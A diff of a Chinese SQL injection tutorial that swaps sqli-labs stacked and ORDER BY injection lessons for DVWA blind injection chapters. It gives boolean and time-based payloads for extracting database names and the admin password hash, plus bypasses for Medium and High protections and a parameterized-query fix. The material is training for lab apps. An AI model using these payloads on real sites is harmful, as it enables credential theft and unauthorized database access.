+我们要知道 SUBSTRING(DATABASE(), i, 1)，对于 i=1 到 4。
 
-验证完堆叠注入可用，后面的操作就和Less-42一样了：
-
-**改密码：**
+**猜第 1 个字符：**
 ```
-123'; update users set password='newpass' where username='admin' --
-```
-
-**加用户：**
-```
-123'; insert into users values (77, 'testuser', 'testpass') --
+1' AND ASCII(SUBSTRING(DATABASE(),1,1)) > 100 --  → True  ✅ (ASCII > 100, 字母 > 'd')
+1' AND ASCII(SUBSTRING(DATABASE(),1,1)) > 110 --  → False ❌ (≤ 110)  → 范围 (100,110]
+1' AND ASCII(SUBSTRING(DATABASE(),1,1)) > 105 --  → False ❌ (≤ 105)  → 范围 (100,105]
+1' AND ASCII(SUBSTRING(DATABASE(),1,1)) > 102 --  → False ❌ (≤ 102)  → 范围 (100,102] → 101 or 102
+1' AND ASCII(SUBSTRING(DATABASE(),1,1)) = 100 --  → False ❌
+1' AND ASCII(SUBSTRING(DATABASE(),1,1)) = 101 --  → True  ✅  ASCII=101 = 'd'！
 ```
 
-虽然看不到回显，但操作一样能执行！就像是你在暗室里操作，虽然看不见，但手还是能动的！🌙
-
----
-
-### Less-45：POST - 单引号+括号 - 堆叠注入 - 盲注 🎯
-
-**关卡特点**：和Less-44类似，单引号+括号闭合，盲注
-
-#### 快速通关 ⚡
-
-Less-45 = Less-44 + 括号闭合
-
-相信聪明的你已经猜到怎么玩了！
-
-**判断闭合方式：**
-- 密码输入：`123') or ('1'=('1`
-- 或者更简单：`123') or 1=1 --`
-
-如果能登录成功，说明闭合成功！
-
-**验证堆叠注入：**
+太棒！第 1 个字符是 **'d'**！按同样套路猜剩下 3 个（这里简化，只给最终 payload）：
 ```
-123'); select sleep(5) --
+第 2 字符 ASCII=118 = 'v' → 1' AND ASCII(SUBSTRING(DATABASE(),2,1))=118 -- ✅
+第 3 字符 ASCII=119 = 'w' → 1' AND ASCII(SUBSTRING(DATABASE(),3,1))=119 -- ✅
+第 4 字符 ASCII=97  = 'a' → 1' AND ASCII(SUBSTRING(DATABASE(),4,1))=97  -- ✅
 ```
 
-**改密码：**
+**Step 4 拼起来：d + v + w + a = 'dvwa'！🎉🎉🎉** 数据库名爆出来了！
+
+下面这张 SVG 流程图把"猜第 1 个字符是 'd'"的二分查找过程画成了决策树👇
+
+<svg width="100%" viewBox="0 0 900 520" xmlns="http://www.w3.org/2000/svg" style="margin:20px 0;">
+  <rect x="0" y="0" width="900" height="520" rx="14" fill="#fffbeb" stroke="#d97706" stroke-width="2"/>
+  <text x="450" y="40" text-anchor="middle" font-family="Microsoft YaHei" font-size="20" fill="#92400e" font-weight="bold">🔍 猜 DATABASE() 第 1 个字符的二分查找决策树（最多 7 次猜中 0~127 任一字节）</text>
+  <!-- Level 0 根节点 -->
+  <g transform="translate(380,65)">
+    <rect x="0" y="0" width="140" height="52" rx="26" fill="#2563eb" stroke="#1e40af" stroke-width="2"/>
+    <text x="70" y="22" text-anchor="middle" font-family="Consolas" font-size="13" fill="white" font-weight="bold">ASCII > 64?</text>
+    <text x="70" y="42" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#bfdbfe">第 1 次请求</text>
+  </g>
+  <!-- 分支线 level 0-1 -->
+  <line x1="450" y1="117" x2="230" y2="155" stroke="#2563eb" stroke-width="2.5"/>
+  <line x1="450" y1="117" x2="670" y2="155" stroke="#2563eb" stroke-width="2.5"/>
+  <text x="280" y="143" font-family="Microsoft YaHei" font-size="12" fill="#16a34a" font-weight="bold">Yes (≤127 都>64)</text>
+  <text x="620" y="143" font-family="Microsoft YaHei" font-size="12" fill="#dc2626" font-weight="bold">No</text>
+  <!-- Level 1: > 96? -->
+  <g transform="translate(150,160)">
+    <rect x="0" y="0" width="140" height="52" rx="26" fill="#16a34a" stroke="#15803d" stroke-width="2"/>
+    <text x="70" y="22" text-anchor="middle" font-family="Consolas" font-size="13" fill="white" font-weight="bold">ASCII > 96?</text>
+    <text x="70" y="42" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#bbf7d0">第 2 次</text>
+  </g>
+  <!-- Level 1 分支 -->
+  <line x1="220" y1="212" x2="130" y2="255" stroke="#2563eb" stroke-width="2.5"/>
+  <line x1="220" y1="212" x2="310" y2="255" stroke="#2563eb" stroke-width="2.5"/>
+  <text x="105" y="243" font-family="Microsoft YaHei" font-size="11" fill="#dc2626" font-weight="bold">No</text>
+  <text x="330" y="243" font-family="Microsoft YaHei" font-size="11" fill="#16a34a" font-weight="bold">Yes ✅ (>96 小写字母)</text>
+  <!-- Level 2: > 112? 和 > 104? -->
+  <g transform="translate(240,260)">
+    <rect x="0" y="0" width="140" height="52" rx="26" fill="#16a34a" stroke="#15803d" stroke-width="2"/>
+    <text x="70" y="22" text-anchor="middle" font-family="Consolas" font-size="13" fill="white" font-weight="bold">ASCII > 104?</text>
+    <text x="70" y="42" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#bbf7d0">第 3 次</text>
+  </g>
+  <line x1="310" y1="312" x2="260" y2="355" stroke="#2563eb" stroke-width="2.5"/>
+  <line x1="310" y1="312" x2="360" y2="355" stroke="#2563eb" stroke-width="2.5"/>
+  <text x="215" y="343" font-family="Microsoft YaHei" font-size="11" fill="#dc2626" font-weight="bold">No → 范围(96,104]</text>
+  <text x="375" y="343" font-family="Microsoft YaHei" font-size="11" fill="#16a34a" font-weight="bold">Yes</text>
+  <!-- Level 3: 走左边 (96,104] 再二分 -->
+  <g transform="translate(155,360)">
+    <rect x="0" y="0" width="160" height="52" rx="26" fill="#16a34a" stroke="#15803d" stroke-width="2"/>
+    <text x="80" y="22" text-anchor="middle" font-family="Consolas" font-size="13" fill="white" font-weight="bold">ASCII > 100?</text>
+    <text x="80" y="42" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#bbf7d0">第 4 次 → Yes ✅ (99<101<104)</text>
+  </g>
+  <line x1="235" y1="412" x2="215" y2="460" stroke="#2563eb" stroke-width="2.5"/>
+  <!-- Level 4: 再二分 (100,104] -->
+  <g transform="translate(110,465)">
+    <rect x="0" y="0" width="180" height="50" rx="25" fill="#d97706" stroke="#92400e" stroke-width="2.5"/>
+    <text x="90" y="20" text-anchor="middle" font-family="Consolas" font-size="13" fill="white" font-weight="bold">ASCII = 101 ?</text>
+    <text x="90" y="40" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#fef3c7">第 6 次 → Yes ✅ 'd'！</text>
+  </g>
+  <!-- 结果高亮：ASCII=101 高亮框 -->
+  <g transform="translate(590,190)">
+    <rect x="0" y="0" width="280" height="310" rx="14" fill="#f0f9ff" stroke="#0ea5e9" stroke-width="2.5"/>
+    <text x="140" y="35" text-anchor="middle" font-family="Microsoft YaHei" font-size="16" fill="#0c4a6e" font-weight="bold">🎯 本次猜解总览</text>
+    <g transform="translate(20,55)">
+      <text x="0" y="0" font-family="Consolas" font-size="12" fill="#334155">第1次 >64?   → Yes</text>
+      <text x="0" y="22" font-family="Consolas" font-size="12" fill="#334155">第2次 >96?   → Yes</text>
+      <text x="0" y="44" font-family="Consolas" font-size="12" fill="#334155">第3次 >104?  → No  (≤104)</text>
+      <text x="0" y="66" font-family="Consolas" font-size="12" fill="#334155">第4次 >100?  → Yes (>100)</text>
+      <text x="0" y="88" font-family="Consolas" font-size="12" fill="#334155">第5次 >102?  → No  (≤102)</text>
+      <text x="0" y="110" font-family="Consolas" font-size="12" fill="#16a34a" font-weight="bold">第6次 =101?  → Yes ✅</text>
+      <line x1="0" y1="125" x2="240" y2="125" stroke="#0ea5e9" stroke-width="2"/>
+      <text x="0" y="150" font-family="Microsoft YaHei" font-size="14" fill="#0c4a6e" font-weight="bold">结论：第 1 个字符 = 'd'</text>
+      <text x="0" y="180" font-family="Microsoft YaHei" font-size="13" fill="#0369a1">第 2 个字符 'v' (ASCII=118)</text>
+      <text x="0" y="205" font-family="Microsoft YaHei" font-size="13" fill="#0369a1">第 3 个字符 'w' (ASCII=119)</text>
+      <text x="0" y="230" font-family="Microsoft YaHei" font-size="13" fill="#0369a1">第 4 个字符 'a' (ASCII=97)</text>
+    </g>
+    <rect x="20" y="270" width="240" height="32" rx="8" fill="#0ea5e9"/>
+    <text x="140" y="292" text-anchor="middle" font-family="Consolas" font-size="17" fill="white" font-weight="bold">DATABASE() = 'dvwa' 🎉</text>
+  </g>
+</svg>
+
+### 16.2.5 布尔盲注实战：爆破 admin 用户的密码 hash（一步步完整演示）
+
+爆库名只是开胃菜！正餐是爆 **admin 用户的 password 字段**（DVWA 里是 MD5 32 位），我们按 4 步来：
+
+**Step 1：先确认 admin 用户存在 + 猜 password 长度？**
 ```
-123'); update users set password='hacked' where username='admin' --
+输入 1' AND EXISTS(SELECT * FROM users WHERE user='admin' AND LENGTH(password)=32) -- → True ✅
+```
+太棒，32 位（说明就是 MD5！）。
+
+**Step 2：逐个字符猜 password 的 32 个字符。** 第 1 个字符：
+```
+1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)) > 96 --  → True ✅ (小写字母)
+1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)) > 102 -- → False ❌ (≤ 102 = 'f')
+```
+我们可以用 `=` 直接一个个试（因为 32 位 MD5 只有 0-9 和 a-f 16 种可能，比二分法还快！）：
+```
+1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='5' -- → True ✅
+```
+第 1 个字符是 **'5'**！同样套路爆出来前 8 位（方便你对照）：
+```
+第1位='5', 第2位='f', 第3位='4', 第4位='d',
+第5位='3', 第6位='c', 第7位='9', 第8位='1'  →  "5f4d3c91" （正是 password 的 MD5 开头！💪）
+... 重复 32 轮就拿到完整 MD5 →  cmd5 解密 → 'password'！🎉
 ```
 
-完美！是不是感觉越来越顺手了？😎
+> 💡 **零基础小提示：** 布尔盲注手动弄 32 位非常累（16×32=512 次请求），所以实战都是写 Python 脚本跑，我们会在 **16.6 节**给你一份完整脚本直接用！你现在先手动练 3~5 个字符掌握原理就够了。
 
----
+### 16.2.6 时间盲注打法②：如果页面连 True/False 都区分不开怎么办？
 
-### 堆叠注入小结 📝
+**场景：** 页面不管输入啥，都永远显示"User ID exists"（没有 MISSING 字样），布尔盲注用不了——**上时间盲注！** 靠 `SLEEP(3)` 让页面延迟。
 
-Less41到Less45这五关，其实都是围绕"堆叠注入"这个核心知识点，只是场景稍有不同：
+**Step 1：测试 SLEEP 有没有生效？**
+```
+输入 1' AND SLEEP(3) --  → 点 Submit → 等了整整 3 秒才返回！✅ 成功！
+```
+（如果输入 `1 AND SLEEP(3)` 立刻返回，那说明是字符型，必须加 `'` 闭合，跟上面一样）
 
-| 关卡 | 提交方式 | 闭合方式 | 回显类型 |
-|------|---------|---------|---------|
-| Less-41 | GET | 数字型 | 盲注 |
-| Less-42 | POST | 单引号 | 错误回显 |
-| Less-43 | POST | 单引号+括号 | 错误回显 |
-| Less-44 | POST | 单引号 | 盲注 |
-| Less-45 | POST | 单引号+括号 | 盲注 |
-
-**核心思路都是一样的：**
-1. 先找注入点
-2. 确定闭合方式
-3. 验证堆叠注入是否可用
-4. 然后就可以为所欲为了！😈
-
----
-
-## 第二部分：ORDER BY注入（Less46-53）📊
-
-### 什么是ORDER BY注入？🤔
-
-在讲新关卡之前，我们先来学习一个新概念：**ORDER BY注入**。
-
-还记得我们之前学的注入，注入点大都在哪里吗？对，大都在 `WHERE` 子句后面，比如：
-```sql
-SELECT * FROM users WHERE id='$id'
+**Step 2：猜 DATABASE() 长度？**
+```
+1' AND IF(LENGTH(DATABASE())=4, SLEEP(3), 0) -- → 延迟 3 秒 ✅ 长度是 4！
+1' AND IF(LENGTH(DATABASE())=5, SLEEP(3), 0) -- → 立刻返回 ❌
 ```
 
-但是！注入点不一定总在WHERE后面！它还可能在别的地方，比如 **ORDER BY** 后面！
-
-ORDER BY是用来做什么的呢？它是用来**排序**的。比如：
-```sql
-SELECT * FROM users ORDER BY id
+**Step 3：逐个字符猜**（以第 1 字符为例）：
 ```
-这条语句的意思是：查询users表的所有数据，按id字段排序。
+1' AND IF(SUBSTRING(DATABASE(),1,1)='d', SLEEP(3), 0) -- → 延迟 3 秒 ✅ 第1位='d'！
+```
+剩下字符一样套路。**时间盲注的关键：只要响应时间 > 2.5 秒就算 True，否则算 False。**
 
-如果一个网站的排序功能是这样实现的：
+### 16.2.7 Low 级别源码解析：为啥它这么容易被打？💻
+
+打开 DVWA 源码文件 `vulnerabilities/sqli_blind/source/low.php`：
+
 ```php
-$sort = $_GET['sort'];
-$sql = "SELECT * FROM users ORDER BY $sort";
+<?php
+// (C) 2010-... Damn Vulnerable Web Application
+if( isset( $_GET[ 'Submit' ] ) ) {
+    $id = $_GET[ 'id' ];  // ⚠️ 问题1：直接拿用户输入，完全没过滤！
+
+    // 查询数据库
+    $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+    // ⚠️ 问题2：直接把 $id 拼到 SQL 字符串里，单引号直接结束前面的字符串！
+    $result = mysql_query( $getid ) or die( '<pre>' . mysql_error() . '</pre>' );
+    $num = mysql_numrows( $result );
+
+    if( $num > 0 ) {
+        // ✅ True 页面：查到记录
+        echo '<pre>User ID exists in the database.</pre>';
+    } else {
+        // ❌ False 页面：空结果
+        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
+        echo '<pre>User ID is MISSING from the database.</pre>';
+    }
+    mysql_close();
+}
+?>
 ```
-那么注入点就在ORDER BY后面！这就是ORDER BY注入。
 
-#### 生活小例子 🍎
+**问题点（Low 级别 2 大致命漏洞）：**
+1. **❌ 无任何过滤：** `$id` 直接从 `$_GET['id']` 取出，没 `mysql_real_escape_string()`，没 intval()，没删除单引号——我们的 `1' AND 1=2 -- ` 原封不动拼了进去。
+2. **❌ 页面给出稳定 True/False：** `num_rows > 0` 给了明确的两种不同页面反馈——相当于"高冷客服"直接点头摇头，太方便了。
 
-打个比方，你去奶茶店买奶茶：
-- 正常情况："给我按价格从低到高排，我看看最便宜的多少钱" 💰
-- ORDER BY注入："给我按价格从低到高排，顺便告诉我你们店的WiFi密码是多少" 📶
+**修复建议（Low → Impossible）：** 用 **PDO 预处理语句 + 白名单**，详见 16.5 节。
 
-说白了，就是把排序的参数给利用起来了！
+---
 
-#### 为什么ORDER BY注入特殊？❓
+## 16.3 Medium 级别：加了过滤？我们绕过它！🧨
 
-那ORDER BY注入和普通注入有什么不一样呢？为什么要单独拿出来讲？
+### 16.3.1 Medium 做了什么保护？看页面和请求区别
 
-因为 **联合注入在ORDER BY后面用不了！** 😱
+先把 DVWA Security 切到 **medium**。
 
-为什么？我们来试试：
+你会发现 **URL 上看不到 `?id=` 参数了！** 而且提交按钮提交后页面 URL 还是不变。抓个 Burp 包（或者浏览器 F12 → Network）一看：
+- 请求方法：**POST**（不是 GET 了！参数在 body 里）
+- Content-Type：application/x-www-form-urlencoded
+- POST Body：`id=1&Submit=Submit`
+
+**这意味着：Burp Suite / HackBar POST 请求 / Python requests 上场！** 不能只在 URL 里改参数了。
+
+### 16.3.2 防护一：`mysql_real_escape_string()` 了单引号？但是...
+
+看 Medium 源码：
+```php
+$id = mysql_real_escape_string($_POST['id']); // 转义单引号、双引号等
+$getid = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
+// ⚠️ 注意！这里 user_id = $id 外面没有引号！！是数字型查询！
+```
+
+**哈哈！经典乌龙开发者操作来了！🤣**
+> 开发者心想：我用了 `mysql_real_escape_string()` 把单引号全转义成 `\'`，SQL 注入肯定没戏了！
+> 结果：查询语句写成了 `WHERE user_id = $id`（$id 外**没有单引号**！）—— 这是**数字型注入**，根本不需要单引号！！
+
+等于他在门上装了个最高级的指纹锁，然后**忘记装门**了 😂。
+
+### 16.3.3 数字型注入 payload（不需要单引号！）
+
+我们把 Low 级别的 payload 里所有 `'` 全部删掉，把 `-- ` 注释换成 `#` 也行：
+
+**布尔盲注 True/False 测试：**
+```
+POST Body: id=1 AND 1=1&Submit=Submit     → exists  ✅ True
+POST Body: id=1 AND 1=2&Submit=Submit     → missing ✅ False
+```
+**完美闭合！不用单引号！**（数字型就是这么任性 😎）
+
+**猜数据库名长度：**
+```
+POST: id=1 AND LENGTH(DATABASE())=4&Submit=Submit → True ✅ (dvwa 长度 4)
+```
+**逐字符猜库名（第 1 字符 'd' ASCII=100）：**
+```
+POST: id=1 AND ASCII(SUBSTRING(DATABASE(),1,1))=100&Submit=Submit → True ✅
+```
+
+**时间盲注（同样不需要单引号）：**
+```
+POST: id=1 AND IF(SUBSTRING(DATABASE(),1,1)='d',SLEEP(3),0)&Submit=Submit → 延迟3s ✅
+```
+
+### 16.3.4 Medium 源码解析 + 绕过总结
+
+```php
+<?php
+if( isset( $_POST[ 'Submit' ] ) ) {
+    $id = mysql_real_escape_string( $_POST[ 'id' ] ); // ✅ 本想防字符型注入
+    $getid = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
+    // ⚠️ 但是 $id 两侧没有引号！= 数字型注入，根本不需要单引号！
+    $result = mysql_query( $getid ) or die( '<pre>' . mysql_error() . '</pre>' );
+    // ... 同样给出 exists / missing 两种 True/False 反馈
+}
+?>
+```
+
+**Medium 的两处"伪防护"总结：**
+1. **❌ GET→POST：** 防君子不防小人，Burp/requests 改改 method 就完事
+2. **❌ mysql_real_escape_string() + 无引号：** 自欺欺人，数字型注入直接绕过
+
+> 🔥 **零基础启示：** 安全防护不是"加个函数就行"，要从**场景匹配**的角度思考——字符型用了转义+引号是对的，但你数字型写的查询就必须用 `intval($id)` 强转整数才对！
+
+---
+
+## 16.4 High 级别：加了 LIMIT + Anti-CSRF Token？照打不误！⚔️
+
+### 16.4.1 High 级别加了啥防护？
+
+切到 **high** 级别，发现 3 个变化：
+1. **表单里多了一个隐藏 `user_token` 字段**（Anti-CSRF Token，必须先 GET 页面取 token，再带 token POST）
+2. **SQL 语句里加了 `LIMIT 1`**：开发者心想"就算被注入，你最多只能拿 1 条数据，我看你咋办"
+3. **id 依然是字符型**（`WHERE user_id = '$id' LIMIT 1;`）
+
+### 16.4.2 绕过 Anti-CSRF Token 的思路
+
+先 GET 请求一次页面（带上我们的 PHPSESSID cookie），从返回的 HTML 里用正则抠出 `user_token`：
+
+```html
+<input type="hidden" name="user_token" value="9079fd3efb1098e1a61aa34a992b9d7a">
+```
+
+拿到 token 之后，**下一次 POST 请求必须把 `user_token=9079fd...` 一并发过去**，不然服务器返回"Invalid token"。
+
+> 🔥 **关键！High 级别每完成一次查询，token 都会变！** 所以我们不能"批量猜"，必须"拿一次 token，发一次请求；再拿一次 token，再发一次请求"——这就是为啥 High 级别比 Low/Medium 慢。Day15 JS Attacks 第 4 关（多步 token）我们练过一模一样的流程！老规矩用 Python Session + re.search 自动搞定👇（脚本见 16.6 节）。
+
+### 16.4.3 绕过 `LIMIT 1`？用注释符 `--` 直接注释掉！
+
+High 级别的 SQL 拼接：
 ```sql
-SELECT * FROM users ORDER BY id UNION SELECT 1,2,3 --
-```
-这条SQL语句是有语法错误的！因为 `ORDER BY` 后面不能直接跟 `UNION`。
-
-这就好比你在食堂打饭，正常流程是"选菜→付钱→拿饭"，但你非要"选菜→直接进厨房"，这不符合规矩，阿姨当然不让你进啦！🍚
-
-那怎么办呢？别急，办法还是有的！ORDER BY注入虽然不能用联合注入，但我们还有其他武器：
-1. **报错注入**：updatexml、extractvalue这些都能用
-2. **布尔盲注**：基于页面返回结果的不同来判断
-3. **时间盲注**：基于页面响应时间来判断
-4. **堆叠注入**：如果支持多语句执行的话
-
-好，理论讲完了，让我们去实战中体会一下！🎮
-
----
-
-### Less-46：GET - 数字型 - ORDER BY - 报错注入 🎯
-
-**关卡特点**：注入点在ORDER BY后面、数字型、有错误回显
-
-#### 第一步：观察和测试 🔍
-
-打开Less-46，我们看到URL里有个 `sort` 参数：
-```
-http://127.0.0.1/sqli-labs/Less-46/?sort=1
+SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;
 ```
 
-页面上显示了一个用户列表，看起来是按某个字段排序的。
-
-我们试试修改sort的值：
-```
-?sort=2  -- 看看排序有没有变化
-?sort=3  -- 再试试
-```
-
-如果排序方式变了，说明sort参数确实是用来排序的，注入点很可能就在这里！
-
-#### 第二步：判断注入类型 📐
-
-我们试试加个单引号：
-```
-?sort=1'
-```
-如果报错了，说明是字符型；如果没报错但排序乱了，可能是数字型。
-
-Less-46是数字型的，所以加单引号会报错（因为数字后面加单引号不符合SQL语法）。
-
-我们来确认一下报错注入能不能用：
-```
-?sort=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)
-```
-
-或者用updatexml更简单：
-```
-?sort=1 and updatexml(1,concat(0x7e,version(),0x7e),1)
-```
-
-哎？报错了！而且报错信息里还包含了数据库版本信息！太好了，**报错注入可用**！🎉
-
-#### 第三步：报错注入拿数据 📥
-
-既然报错注入能用，那后面就简单了，按我们之前学的报错注入套路来就行！
-
-**获取数据库名：**
-```
-?sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1)
-```
-假设得到数据库名是 `security`
-
-**获取表名：**
-```
-?sort=1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)
-```
-得到第一个表名，然后改limit依次获取其他表
-
-**获取列名：**
-```
-?sort=1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),1)
-```
-
-**获取数据：**
-```
-?sort=1 and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)
-```
-
-完美！虽然联合注入用不了，但报错注入一样能拿到数据！💪
-
-> **💡 小贴士**：ORDER BY注入还可以用 `if` 语句来控制排序，从而实现布尔盲注。比如：
-> ```
-> ?sort=if(1=1,id,username)
-> ```
-> 如果1=1成立，就按id排序；否则按username排序。通过观察排序结果的不同，我们就能判断条件是否成立。这就是布尔盲注的思路！
-
----
-
-### Less-47：GET - 单引号 - ORDER BY - 报错注入 🎯
-
-**关卡特点**：ORDER BY注入、单引号闭合、报错注入
-
-#### 快速通关 ⚡
-
-Less-47和Less-46几乎一模一样，唯一的区别就是**闭合方式不同**。
-
-Less-46是数字型，直接写语句就行；Less-47是单引号闭合，所以我们需要先闭合单引号。
-
-**测试单引号：**
-```
-?sort=1'
-```
-会报错，因为多了个单引号。
-
-**正确闭合：**
-```
-?sort=1' and updatexml(1,concat(0x7e,version(),0x7e),1) --
-```
-等等，这样对吗？让我们想想SQL语句变成了什么样：
+我们的 payload：
 ```sql
-SELECT * FROM users ORDER BY '1' and updatexml(...) -- '
+1' AND SUBSTRING(DATABASE(),1,1)='d' -- 
 ```
-嗯……好像有点问题，因为ORDER BY后面跟着一个字符串，这样排序可能不会正常工作，但报错注入应该还是能触发的。
-
-或者我们可以这样写：
+后端拼接完变成：
+```sql
+SELECT ... WHERE user_id = '1' AND SUBSTRING(DATABASE(),1,1)='d' -- ' LIMIT 1;
 ```
-?sort=1' and (select updatexml(1,concat(0x7e,version(),0x7e),1)) --
-```
+看见没？**`-- '` 之后的 LIMIT 1（还有闭合单引号）都被当成注释忽略了！**🤣 开发者加的 `LIMIT 1` 直接白给！
 
-总之，核心思路就是：**先闭合单引号，然后写我们的注入语句**。
-
-剩下的操作就和Less-46完全一样了，报错注入走起来！🚀
-
----
-
-### Less-48：GET - 数字型 - ORDER BY - 盲注 🎯
-
-**关卡特点**：ORDER BY注入、数字型、盲注（没有错误回显）
-
-#### 关卡分析 📊
-
-Less-48和Less-46的注入点一样，都是sort参数，都是数字型。但是！Less-48是**盲注**，没有错误回显！
-
-那报错注入就用不了了……怎么办呢？
-
-别急，我们还有 **布尔盲注** 和 **时间盲注**！
-
-#### 方法一：布尔盲注（基于排序的不同） 🔄
-
-ORDER BY盲注有个很有意思的玩法，就是**利用排序结果的不同来判断**。
-
-因为ORDER BY是用来排序的，如果我们能控制排序的依据，就能通过观察排序结果来判断条件是否成立。
-
-打个比方：
-- 正常按id排序：用户是按1、2、3...排的
-- 如果条件成立，按id排：顺序还是1、2、3...
-- 如果条件不成立，按username排：顺序可能就变成admin、dummy...了
-
-通过观察页面上用户的顺序，我们就能判断条件是否成立！
-
-**怎么写呢？用IF语句！**
-```
-?sort=if(条件, id, username)
-```
-
-解释一下：
-- 如果条件成立 → 按id排序
-- 如果条件不成立 → 按username排序
-
-**示例：判断数据库名的第一个字符**
-```
-?sort=if(ascii(substr(database(),1,1))=115, id, username)
-```
-- 115是字母's'的ASCII码
-- 如果数据库名第一个字母是's' → 按id排序
-- 否则 → 按username排序
-
-通过观察页面上用户的排列顺序，我们就能判断对错！这就是ORDER BY的布尔盲注！🎯
-
-是不是很巧妙？就像是你问了一个问题，对方不用说话，只是通过站队的顺序来回答你！👥
-
-#### 方法二：时间盲注 ⏰
-
-如果觉得观察排序太麻烦，我们还可以用时间盲注，简单粗暴！
+### 16.4.4 High 级别完整 payload（布尔盲注 + 时间盲注）
 
 ```
-?sort=1 and if(条件, sleep(5), 1)
+布尔盲注 True/False：
+  POST: id=1' AND 1=1 -- &user_token=xxxx&Submit=Submit  → exists True
+  POST: id=1' AND 1=2 -- &user_token=xxxx&Submit=Submit  → missing False
+
+布尔猜第1字符 'd'：
+  POST: id=1' AND ASCII(SUBSTRING(DATABASE(),1,1))=100 -- &user_token=xxxx → True ✅
+
+时间盲注（保险起见最常用）：
+  POST: id=1' AND IF(SUBSTRING(DATABASE(),1,1)='d', SLEEP(3), 0) -- &token=xxxx → 延迟3s ✅
 ```
 
-**示例：判断数据库名第一个字符**
-```
-?sort=1 and if(ascii(substr(database(),1,1))=115, sleep(5), 1)
+### 16.4.5 High 源码逐行解析 💻
+
+```php
+<?php
+if( isset( $_POST[ 'Submit' ] ) ) {
+    // Anti-CSRF Token 校验
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    $id = $_POST[ 'id' ];  // ⚠️ 问题：id 完全没过滤！
+    $id = stripslashes( $id ); // stripslashes 反而把转义的 \' 还原成 '，帮倒忙！
+
+    $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
+    // ⚠️ 字符型：给了我们 ' 注入机会；LIMIT 1 被 -- 直接注释无效
+    $result = mysql_query( $getid ) or die( '<pre>' . mysql_error() . '</pre>' );
+    $num = mysql_numrows( $result );
+
+    if( $num > 0 ) { echo '<pre>User ID exists.</pre>'; }
+    else           { header( '404' ); echo '<pre>User ID is MISSING.</pre>'; }
+    // ⚠️ 问题：依然给出了 True/False 两种页面反馈
+    generateSessionToken(); // 每次请求刷新 token
+}
+// 页面 GET 请求时生成 token
+generateSessionToken();
+?>
 ```
 
-如果页面延迟了5秒，说明条件成立；否则不成立。
-
-时间盲注虽然慢一点，但胜在简单直观，不容易出错！⏰
+**High 三处伪防护总结：**
+1. **Anti-CSRF Token：** Python Session 每次先 GET 拿 token 再 POST，绕过
+2. **stripslashes()：** PHP 开启 GPC（老版本）会给 `'` 自动加 `\'`，但这个函数**帮我们还原成 `'`**了 😂
+3. **LIMIT 1：** `--  ` 注释直接干掉，跟没有一样
 
 ---
 
-### Less-49：GET - 单引号 - ORDER BY - 盲注 - 时间盲注 🎯
+## 16.5 Impossible 级别：彻底无解的正确写法 ✅
 
-**关卡特点**：ORDER BY注入、单引号闭合、盲注
+切到 **impossible**，这时候再注入，无论发啥 payload，页面要么显示 exists（正常），要么直接跳回 setup.php，完全不按你想的 True/False 规律走。看源码：
 
-#### 快速通关 ⚡
+```php
+<?php
+if( isset( $_POST[ 'Submit' ] ) ) {
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
 
-Less-49 = Less-48 + 单引号闭合
+    $id = $_POST[ 'id' ];
+    // ✅ 防护1：intval() 强转整数！彻底没注入机会了
+    if( !is_numeric( $id ) ) { die( 'ID must be a number!' ); }
+    $id = intval( $id );
 
-没错，又是熟悉的配方，熟悉的味道！😋
+    // ✅ 防护2：PDO 预处理语句！参数和 SQL 严格分开
+    $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
+    $data->bindParam( ':id', $id, PDO::PARAM_INT );
+    $data->execute();
 
-**时间盲注Payload：**
-```
-?sort=1' and if(条件, sleep(5), 1) --
-```
-
-**示例：判断数据库名第一个字符**
-```
-?sort=1' and if(ascii(substr(database(),1,1))=115, sleep(5), 1) --
-```
-
-**布尔盲注Payload（基于排序）：**
-```
-?sort=1' and if(条件, 1, 2) --
-```
-或者：
-```
-?sort=if(条件, 'id', 'username') --
+    // ✅ 防护3：只有"恰好查到1行"才说存在，否则都算不存在
+    if( $data->rowCount() == 1 ) { echo '<pre>User ID exists.</pre>'; }
+    else                         { echo '<pre>User ID is MISSING.</pre>'; }
+}
+generateSessionToken();
+?>
 ```
 
-总之，思路都是一样的，就是多了个单引号需要闭合而已！
+**Impossible 的三层"铜墙铁壁"（开发者必看！⭐⭐⭐）：**
+1. **✅ intval() 强转整数 + is_numeric() 校验：** 任何带 `'`、`AND`、`SLEEP` 的输入直接被拦截或转成 `int(1)`，注入点彻底被掐断
+2. **✅ PDO 预处理 + bindParam(PDO::PARAM_INT)：** SQL 结构和用户数据彻底分离，就算是字符串字段也不会被注入（Day10 详细讲过 PDO）
+3. **✅ rowCount()==1 严格判断：** 就算你有其他奇葩方法改了逻辑，只要返回行数不是 1，都当 MISSING，不给攻击者稳定的 True/False 反馈
 
----
-
-### 中间总结：ORDER BY注入的几种利用方式 📝
-
-好，Less46到Less49这四关，我们学习了ORDER BY注入的基本玩法。让我们来总结一下：
-
-#### ORDER BY注入的特点：
-- 注入点在 `ORDER BY` 子句后面
-- **联合注入不能用**（语法不允许）
-- 排序功能的网站容易出现这种注入
-
